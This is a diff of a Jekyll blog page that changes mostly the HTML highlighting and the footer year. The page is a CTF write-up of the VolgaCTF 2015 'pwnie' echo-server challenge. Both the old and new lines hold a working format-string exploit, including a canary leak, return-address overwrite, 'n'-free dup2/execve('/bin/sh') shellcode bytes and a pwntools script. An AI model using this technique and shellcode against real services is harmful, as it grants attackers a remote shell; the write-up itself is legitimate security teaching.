@@ -319,14 +319,14 @@ It’s a simple echo server. Whenever someone connect to it, it fork a process t
 <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">start_echo</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd</span><span class="p">)</span>
 <span class="p">{</span>
 
-    <span class="kt">int</span> <span class="n">result</span><span class="p">;</span> <span class="c1">// eax@4
-</span>    <span class="kt">int</span> <span class="n">v2</span><span class="p">;</span> <span class="c1">// esi@4
-</span>    <span class="kt">int</span> <span class="n">i</span><span class="p">;</span> <span class="c1">// [sp+18h] [bp-A0h]@1
-</span>    <span class="kt">int</span> <span class="n">v4</span><span class="p">;</span> <span class="c1">// [sp+1Ch] [bp-9Ch]@1
-</span>    <span class="kt">int</span> <span class="n">v5</span><span class="p">;</span> <span class="c1">// [sp+20h] [bp-98h]@1
-</span>    <span class="kt">char</span> <span class="n">v6</span><span class="p">;</span> <span class="c1">// [sp+24h] [bp-94h]@1
-</span>    <span class="kt">int</span> <span class="n">v7</span><span class="p">;</span> <span class="c1">// [sp+9Ch] [bp-1Ch]@1
-</span>
+    <span class="kt">int</span> <span class="n">result</span><span class="p">;</span> <span class="c1">// eax@4</span>
+    <span class="kt">int</span> <span class="n">v2</span><span class="p">;</span> <span class="c1">// esi@4</span>
+    <span class="kt">int</span> <span class="n">i</span><span class="p">;</span> <span class="c1">// [sp+18h] [bp-A0h]@1</span>
+    <span class="kt">int</span> <span class="n">v4</span><span class="p">;</span> <span class="c1">// [sp+1Ch] [bp-9Ch]@1</span>
+    <span class="kt">int</span> <span class="n">v5</span><span class="p">;</span> <span class="c1">// [sp+20h] [bp-98h]@1</span>
+    <span class="kt">char</span> <span class="n">v6</span><span class="p">;</span> <span class="c1">// [sp+24h] [bp-94h]@1</span>
+    <span class="kt">int</span> <span class="n">v7</span><span class="p">;</span> <span class="c1">// [sp+9Ch] [bp-1Ch]@1</span>
+
     <span class="n">v7</span> <span class="o">=</span> <span class="o">*</span><span class="n">MK_FP</span><span class="p">(</span><span class="n">__GS__</span><span class="p">,</span> <span class="mi">20</span><span class="p">);</span>
     <span class="n">send_to_user</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="s">"This is a simple echo server. Type exit to quit.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
     <span class="n">v4</span> <span class="o">=</span> <span class="s">"ohcE"</span><span class="p">;</span>
@@ -341,18 +341,18 @@ It’s a simple echo server. Whenever someone connect to it, it fork a process t
 <span class="p">}</span>
 </code></pre></div></div>
 
-<p>So, the <code class="highlighter-rouge">start_echo()</code> will call <code class="highlighter-rouge">echoing(v4, fd)</code> , which v4 is a pointer to char<br />
-Let’s take a look at the <code class="highlighter-rouge">echoing()</code> function:</p>
+<p>So, the <code class="language-plaintext highlighter-rouge">start_echo()</code> will call <code class="language-plaintext highlighter-rouge">echoing(v4, fd)</code> , which v4 is a pointer to char<br />
+Let’s take a look at the <code class="language-plaintext highlighter-rouge">echoing()</code> function:</p>
 
 <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">echoing</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">a1</span><span class="p">,</span> <span class="kt">int</span> <span class="n">fd</span><span class="p">)</span>
 <span class="p">{</span>
-    <span class="kt">int</span> <span class="n">result</span><span class="p">;</span> <span class="c1">// eax@2
-</span>    <span class="kt">int</span> <span class="n">v3</span><span class="p">;</span> <span class="c1">// ecx@10
-</span>    <span class="kt">int</span> <span class="n">v4</span><span class="p">;</span> <span class="c1">// [sp+20h] [bp-58h]@3
-</span>    <span class="kt">char</span> <span class="o">*</span><span class="n">i</span><span class="p">;</span> <span class="c1">// [sp+24h] [bp-54h]@3
-</span>    <span class="kt">char</span> <span class="n">user_input</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span> <span class="c1">// [sp+2Ch] [bp-4Ch]@1
-</span>    <span class="kt">int</span> <span class="n">v7</span><span class="p">;</span> <span class="c1">// [sp+6Ch] [bp-Ch]@1
-</span>
+    <span class="kt">int</span> <span class="n">result</span><span class="p">;</span> <span class="c1">// eax@2</span>
+    <span class="kt">int</span> <span class="n">v3</span><span class="p">;</span> <span class="c1">// ecx@10</span>
+    <span class="kt">int</span> <span class="n">v4</span><span class="p">;</span> <span class="c1">// [sp+20h] [bp-58h]@3</span>
+    <span class="kt">char</span> <span class="o">*</span><span class="n">i</span><span class="p">;</span> <span class="c1">// [sp+24h] [bp-54h]@3</span>
+    <span class="kt">char</span> <span class="n">user_input</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span> <span class="c1">// [sp+2Ch] [bp-4Ch]@1</span>
+    <span class="kt">int</span> <span class="n">v7</span><span class="p">;</span> <span class="c1">// [sp+6Ch] [bp-Ch]@1</span>
+
     <span class="n">v7</span> <span class="o">=</span> <span class="o">*</span><span class="n">MK_FP</span><span class="p">(</span><span class="n">__GS__</span><span class="p">,</span> <span class="mi">20</span><span class="p">);</span>
     <span class="n">send_to_user</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="s">"Type string to echo back: "</span><span class="p">);</span>
     <span class="n">memset</span><span class="p">(</span><span class="n">user_input</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">64u</span><span class="p">);</span>
@@ -390,63 +390,63 @@ Let’s take a look at the <code class="highlighter-rouge">echoing()</code> func
 <span class="p">}</span>
 </code></pre></div></div>
 <p>So we found that there’s a <strong>format string</strong> vulnerability at the line<br />
-<code class="highlighter-rouge">sprintf(a1 + 6, user_input);</code><br />
+<code class="language-plaintext highlighter-rouge">sprintf(a1 + 6, user_input);</code><br />
 But notice that the program will filter out the character ‘n’, which means we can’t use <strong>%n</strong> to write the memory.</p>
 
-<p>Fortunately, the vulnerability’s happened in <code class="highlighter-rouge">sprintf</code>, not <code class="highlighter-rouge">printf</code>. 
-<code class="highlighter-rouge">sprintf(a1 + 6, user_input)</code> means the <code class="highlighter-rouge">user_input</code> will be <strong>output</strong> to buffer <code class="highlighter-rouge">a1</code> (the one that <code class="highlighter-rouge">start_echo</code> pass into <code class="highlighter-rouge">echoing</code>).</p>
+<p>Fortunately, the vulnerability’s happened in <code class="language-plaintext highlighter-rouge">sprintf</code>, not <code class="language-plaintext highlighter-rouge">printf</code>. 
+<code class="language-plaintext highlighter-rouge">sprintf(a1 + 6, user_input)</code> means the <code class="language-plaintext highlighter-rouge">user_input</code> will be <strong>output</strong> to buffer <code class="language-plaintext highlighter-rouge">a1</code> (the one that <code class="language-plaintext highlighter-rouge">start_echo</code> pass into <code class="language-plaintext highlighter-rouge">echoing</code>).</p>
 
-<p>This behavior can be view as the program <strong>copy</strong> <code class="highlighter-rouge">user_input</code>’s content to <code class="highlighter-rouge">a1</code>. If we input string <code class="highlighter-rouge">"%45c"</code>, the program will output 45 characters to <code class="highlighter-rouge">a1</code>, which is, <strong>copy</strong> 45 characters to <code class="highlighter-rouge">a1</code>.</p>
+<p>This behavior can be view as the program <strong>copy</strong> <code class="language-plaintext highlighter-rouge">user_input</code>’s content to <code class="language-plaintext highlighter-rouge">a1</code>. If we input string <code class="language-plaintext highlighter-rouge">"%45c"</code>, the program will output 45 characters to <code class="language-plaintext highlighter-rouge">a1</code>, which is, <strong>copy</strong> 45 characters to <code class="language-plaintext highlighter-rouge">a1</code>.</p>
 
-<p>So if we construct the payload string carefully, we can overwrite the return address in <code class="highlighter-rouge">start_echo()</code>. First we’ll have to leak the stack canary. After checking the memory by using gdb, we can found that the canary is at <code class="highlighter-rouge">%26$p</code>. We also need to leak <code class="highlighter-rouge">start_echo()</code>’s <code class="highlighter-rouge">ebp</code> too, since we need to calculate the address of <code class="highlighter-rouge">a1</code> ( which is on the stack in function <code class="highlighter-rouge">start_echo()</code> ). We found that <code class="highlighter-rouge">ebp</code> is at <code class="highlighter-rouge">%29$p</code>.</p>
+<p>So if we construct the payload string carefully, we can overwrite the return address in <code class="language-plaintext highlighter-rouge">start_echo()</code>. First we’ll have to leak the stack canary. After checking the memory by using gdb, we can found that the canary is at <code class="language-plaintext highlighter-rouge">%26$p</code>. We also need to leak <code class="language-plaintext highlighter-rouge">start_echo()</code>’s <code class="language-plaintext highlighter-rouge">ebp</code> too, since we need to calculate the address of <code class="language-plaintext highlighter-rouge">a1</code> ( which is on the stack in function <code class="language-plaintext highlighter-rouge">start_echo()</code> ). We found that <code class="language-plaintext highlighter-rouge">ebp</code> is at <code class="language-plaintext highlighter-rouge">%29$p</code>.</p>
 
-<p>So by leaking canary &amp; <code class="highlighter-rouge">start_echo()</code>’s ebp , we can construct our payload now. But there’re some details we need to be aware of:</p>
+<p>So by leaking canary &amp; <code class="language-plaintext highlighter-rouge">start_echo()</code>’s ebp , we can construct our payload now. But there’re some details we need to be aware of:</p>
 <ol>
-  <li><strong><code class="highlighter-rouge">sprintf</code> will stop at null byte</strong>. That is, when <code class="highlighter-rouge">sprintf</code> encounter a null byte, it will write the null byte to the buffer and stop.</li>
-  <li>So, <strong>since the first byte of the canary is always null byte</strong>, we’ll have to modify the canary first, so <code class="highlighter-rouge">sprintf</code> will continue writing bytes to buffer and let us overwrite the return address.</li>
-  <li>After we overwrite the return address, we’ll have to change the canary back to its correct value, by sending another payload string to <code class="highlighter-rouge">sprintf</code>.</li>
-  <li>Don’t forget to write the <code class="highlighter-rouge">fd</code> too, or else it will be overwritten to null byte (thanks to <code class="highlighter-rouge">sprintf</code> apparently )</li>
+  <li><strong><code class="language-plaintext highlighter-rouge">sprintf</code> will stop at null byte</strong>. That is, when <code class="language-plaintext highlighter-rouge">sprintf</code> encounter a null byte, it will write the null byte to the buffer and stop.</li>
+  <li>So, <strong>since the first byte of the canary is always null byte</strong>, we’ll have to modify the canary first, so <code class="language-plaintext highlighter-rouge">sprintf</code> will continue writing bytes to buffer and let us overwrite the return address.</li>
+  <li>After we overwrite the return address, we’ll have to change the canary back to its correct value, by sending another payload string to <code class="language-plaintext highlighter-rouge">sprintf</code>.</li>
+  <li>Don’t forget to write the <code class="language-plaintext highlighter-rouge">fd</code> too, or else it will be overwritten to null byte (thanks to <code class="language-plaintext highlighter-rouge">sprintf</code> apparently )</li>
 </ol>
 
 <p>Here’s the payload string:</p>
-<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">canary</span> <span class="o">|=</span> <span class="mh">0x41</span> <span class="c"># remove the null byte first</span>
-<span class="n">payload</span> <span class="o">=</span> <span class="s">"</span><span class="si">%122</span><span class="s">c"</span> <span class="c"># padding to canary</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">canary</span><span class="p">)</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="s">"A"</span><span class="o">*</span><span class="mi">28</span> <span class="c"># padding to return address</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span> <span class="c"># return address set to buffer's address (=shellcode)</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span> <span class="c"># fd</span>
-<span class="c"># send the first payload</span>
-<span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">canary</span> <span class="o">|=</span> <span class="mh">0x41</span> <span class="c1"># remove the null byte first
+</span><span class="n">payload</span> <span class="o">=</span> <span class="s">"</span><span class="si">%122</span><span class="s">c"</span> <span class="c1"># padding to canary
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">canary</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="s">"A"</span><span class="o">*</span><span class="mi">28</span> <span class="c1"># padding to return address
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span> <span class="c1"># return address set to buffer's address (=shellcode)
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span> <span class="c1"># fd
+# send the first payload
+</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
 
-<span class="n">payload</span> <span class="o">=</span> <span class="s">"</span><span class="si">%122</span><span class="s">c"</span> <span class="c"># add the null byte back into the canary</span>
-<span class="c"># send the second payload</span>
-<span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="s">"</span><span class="si">%122</span><span class="s">c"</span> <span class="c1"># add the null byte back into the canary
+# send the second payload
+</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
 </code></pre></div></div>
 
-<p>So now we overwrite the return address of function <code class="highlighter-rouge">start_echo()</code> and let it jump to the buffer <code class="highlighter-rouge">a1</code>, which we can put our shellcode on it. But again, there’re some limitations:</p>
+<p>So now we overwrite the return address of function <code class="language-plaintext highlighter-rouge">start_echo()</code> and let it jump to the buffer <code class="language-plaintext highlighter-rouge">a1</code>, which we can put our shellcode on it. But again, there’re some limitations:</p>
 <ol>
-  <li>It’s a <strong>fork server</strong>, so we can’t simply just execute <code class="highlighter-rouge">execve("/bin/sh")</code>. The problem cause by file descriptor will make us fail to execute our own command after we get the shell.</li>
-  <li>So, we’ll have to construct a shellcode, which execute <code class="highlighter-rouge">dup2(4, 0)</code>, <code class="highlighter-rouge">dup2(4, 1)</code> and <code class="highlighter-rouge">dup2(4, 2)</code> before executing <code class="highlighter-rouge">execve("/bin/sh")</code>.</li>
+  <li>It’s a <strong>fork server</strong>, so we can’t simply just execute <code class="language-plaintext highlighter-rouge">execve("/bin/sh")</code>. The problem cause by file descriptor will make us fail to execute our own command after we get the shell.</li>
+  <li>So, we’ll have to construct a shellcode, which execute <code class="language-plaintext highlighter-rouge">dup2(4, 0)</code>, <code class="language-plaintext highlighter-rouge">dup2(4, 1)</code> and <code class="language-plaintext highlighter-rouge">dup2(4, 2)</code> before executing <code class="language-plaintext highlighter-rouge">execve("/bin/sh")</code>.</li>
   <li>Don’t forget the program will filter out the character ‘n’, so we’ll have to do something with it.</li>
 </ol>
 
-<p>For problem 3, my solution was construct a shellcode without having character ‘n’. Or, you can just overwrite the return address to <code class="highlighter-rouge">user_input</code>, since the program doesn’t modify the input, the original input string will still remain on the buffer.</p>
+<p>For problem 3, my solution was construct a shellcode without having character ‘n’. Or, you can just overwrite the return address to <code class="language-plaintext highlighter-rouge">user_input</code>, since the program doesn’t modify the input, the original input string will still remain on the buffer.</p>
 
-<p>Anyway, I choose to construct a shellcode without having character ‘n’. Typically, during the shellcode construction for executing <code class="highlighter-rouge">execve("/bin/sh")</code>, we’ll have the following assembly:</p>
+<p>Anyway, I choose to construct a shellcode without having character ‘n’. Typically, during the shellcode construction for executing <code class="language-plaintext highlighter-rouge">execve("/bin/sh")</code>, we’ll have the following assembly:</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>push 0x68732f2f     ; hs//
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>push 0x68732f2f     ; hs//
 push 0x6e69622f     ; nib/
 </code></pre></div></div>
 
-<p>Which has ‘n’ in it. However, we can simply use <code class="highlighter-rouge">xor</code> to eliminate the character ‘n’. Since <code class="highlighter-rouge">0x6e69622f = 0x91969dd0 ^ 0xffffffff</code>, we can modify the assembly into:</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>xor ecx, ecx
+<p>Which has ‘n’ in it. However, we can simply use <code class="language-plaintext highlighter-rouge">xor</code> to eliminate the character ‘n’. Since <code class="language-plaintext highlighter-rouge">0x6e69622f = 0x91969dd0 ^ 0xffffffff</code>, we can modify the assembly into:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>xor ecx, ecx
 dec ecx ; ecx = 0xffffffff
 xor ecx, 0x91969dd0 ; ecx = 0x6e69622f
 push ecx
 </code></pre></div></div>
 
 <p>So here’s the entire assembly:</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>BITS 32
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>BITS 32
 
 global _start
 
@@ -483,15 +483,15 @@ d:
 <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 <span class="kn">import</span> <span class="nn">time</span>
 
-<span class="c">#HOST="localhost"</span>
-<span class="n">HOST</span><span class="o">=</span><span class="s">"pwnie.2015.volgactf.ru"</span>
+<span class="c1">#HOST="localhost"
+</span><span class="n">HOST</span><span class="o">=</span><span class="s">"pwnie.2015.volgactf.ru"</span>
 <span class="n">PORT</span><span class="o">=</span><span class="s">"7777"</span>
 
-<span class="c"># dup2(4, 0) + dup2(4, 1) + dup2(4, 2) + execve('/bin/sh'), 46 byte</span>
-<span class="n">shellcode</span> <span class="o">=</span>  <span class="p">[</span><span class="mh">0x31</span><span class="p">,</span> <span class="mh">0xdb</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0xc0</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0xc9</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0xd2</span><span class="p">,</span> <span class="mh">0xb3</span><span class="p">,</span> <span class="mh">0x04</span><span class="p">,</span> <span class="mh">0xb0</span><span class="p">,</span> <span class="mh">0x3f</span><span class="p">,</span> <span class="mh">0xcd</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x83</span><span class="p">,</span> <span class="mh">0xf9</span><span class="p">,</span> <span class="mh">0x03</span><span class="p">,</span> <span class="mh">0x75</span><span class="p">,</span> <span class="mh">0xf6</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0xc0</span><span class="p">,</span> <span class="mh">0xb0</span><span class="p">,</span> <span class="mh">0x0b</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0xc9</span><span class="p">,</span> <span class="mh">0x51</span><span class="p">,</span> <span class="mh">0x68</span><span class="p">,</span> <span class="mh">0x2f</span><span class="p">,</span> <span class="mh">0x2f</span><span class="p">,</span> <span class="mh">0x73</span><span class="p">,</span> <span class="mh">0x68</span><span class="p">,</span> <span class="mh">0x49</span><span class="p">,</span> <span class="mh">0x81</span><span class="p">,</span> <span class="mh">0xf1</span><span class="p">,</span> <span class="mh">0xd0</span><span class="p">,</span> <span class="mh">0x9d</span><span class="p">,</span> <span class="mh">0x96</span><span class="p">,</span> <span class="mh">0x91</span><span class="p">,</span> <span class="mh">0x51</span><span class="p">,</span> <span class="mh">0x89</span><span class="p">,</span> <span class="mh">0xe3</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0xc9</span><span class="p">,</span> <span class="mh">0xcd</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">]</span>
+<span class="c1"># dup2(4, 0) + dup2(4, 1) + dup2(4, 2) + execve('/bin/sh'), 46 byte
+</span><span class="n">shellcode</span> <span class="o">=</span>  <span class="p">[</span><span class="mh">0x31</span><span class="p">,</span> <span class="mh">0xdb</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0xc0</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0xc9</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0xd2</span><span class="p">,</span> <span class="mh">0xb3</span><span class="p">,</span> <span class="mh">0x04</span><span class="p">,</span> <span class="mh">0xb0</span><span class="p">,</span> <span class="mh">0x3f</span><span class="p">,</span> <span class="mh">0xcd</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x83</span><span class="p">,</span> <span class="mh">0xf9</span><span class="p">,</span> <span class="mh">0x03</span><span class="p">,</span> <span class="mh">0x75</span><span class="p">,</span> <span class="mh">0xf6</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0xc0</span><span class="p">,</span> <span class="mh">0xb0</span><span class="p">,</span> <span class="mh">0x0b</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0xc9</span><span class="p">,</span> <span class="mh">0x51</span><span class="p">,</span> <span class="mh">0x68</span><span class="p">,</span> <span class="mh">0x2f</span><span class="p">,</span> <span class="mh">0x2f</span><span class="p">,</span> <span class="mh">0x73</span><span class="p">,</span> <span class="mh">0x68</span><span class="p">,</span> <span class="mh">0x49</span><span class="p">,</span> <span class="mh">0x81</span><span class="p">,</span> <span class="mh">0xf1</span><span class="p">,</span> <span class="mh">0xd0</span><span class="p">,</span> <span class="mh">0x9d</span><span class="p">,</span> <span class="mh">0x96</span><span class="p">,</span> <span class="mh">0x91</span><span class="p">,</span> <span class="mh">0x51</span><span class="p">,</span> <span class="mh">0x89</span><span class="p">,</span> <span class="mh">0xe3</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0xc9</span><span class="p">,</span> <span class="mh">0xcd</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">]</span>
 
-<span class="c"># insert 0x90 in the left, make it length = 63</span>
-<span class="n">shellcode</span> <span class="o">=</span> <span class="s">''</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">shellcode</span><span class="p">)</span><span class="o">.</span><span class="n">rjust</span><span class="p">(</span><span class="mi">63</span><span class="p">,</span> <span class="s">"</span><span class="se">\x90</span><span class="s">"</span><span class="p">)</span>
+<span class="c1"># insert 0x90 in the left, make it length = 63
+</span><span class="n">shellcode</span> <span class="o">=</span> <span class="s">''</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">shellcode</span><span class="p">)</span><span class="o">.</span><span class="n">rjust</span><span class="p">(</span><span class="mi">63</span><span class="p">,</span> <span class="s">"</span><span class="se">\x90</span><span class="s">"</span><span class="p">)</span>
 
 <span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">)</span>
 
@@ -511,19 +511,19 @@ d:
 
 <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"echo back: "</span><span class="p">)</span>
 
-<span class="n">canary</span> <span class="o">|=</span> <span class="mh">0x41</span> <span class="c"># remove the null byte first</span>
-<span class="n">payload</span> <span class="o">=</span> <span class="s">"</span><span class="si">%122</span><span class="s">c"</span> <span class="c"># padding to canary</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">canary</span><span class="p">)</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="s">"A"</span><span class="o">*</span><span class="mi">28</span> <span class="c"># padding to return address</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span> <span class="c"># return address set to buffer's address (=shellcode)</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span> <span class="c"># fd</span>
-
+<span class="n">canary</span> <span class="o">|=</span> <span class="mh">0x41</span> <span class="c1"># remove the null byte first
+</span><span class="n">payload</span> <span class="o">=</span> <span class="s">"</span><span class="si">%122</span><span class="s">c"</span> <span class="c1"># padding to canary
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">canary</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="s">"A"</span><span class="o">*</span><span class="mi">28</span> <span class="c1"># padding to return address
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span> <span class="c1"># return address set to buffer's address (=shellcode)
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span> <span class="c1"># fd
+</span>
 <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"sending payload..."</span><span class="p">)</span>
 <span class="n">r</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
 
 <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"echo back: "</span><span class="p">)</span>
-<span class="n">payload</span> <span class="o">=</span> <span class="s">"</span><span class="si">%122</span><span class="s">c"</span> <span class="c"># add the null byte back into the canary</span>
-<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"correcting canary..."</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="s">"</span><span class="si">%122</span><span class="s">c"</span> <span class="c1"># add the null byte back into the canary
+</span><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"correcting canary..."</span><span class="p">)</span>
 <span class="n">r</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
 
 <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"echo back: "</span><span class="p">)</span>
@@ -650,7 +650,6 @@ d:
       <div class="grid__wrapper">
         
           
-          
 
 
 
@@ -670,7 +669,6 @@ d:
 
         
           
-          
 
 
 
@@ -689,7 +687,6 @@ d:
 </div>
 
         
-          
           
 
 
@@ -712,7 +709,6 @@ d:
 
         
           
-          
 
 
 
@@ -733,6 +729,7 @@ d:
         
       </div>
     </div>
+  
   
 </div>
 
@@ -783,7 +780,7 @@ d:
   </ul>
 </div>
 
-<div class="page__footer-copyright">&copy; 2019 Bruce Chen. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/" rel="nofollow">Minimal Mistakes</a>.</div>
+<div class="page__footer-copyright">&copy; 2020 Bruce Chen. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/" rel="nofollow">Minimal Mistakes</a>.</div>
 
       </footer>
     </div>
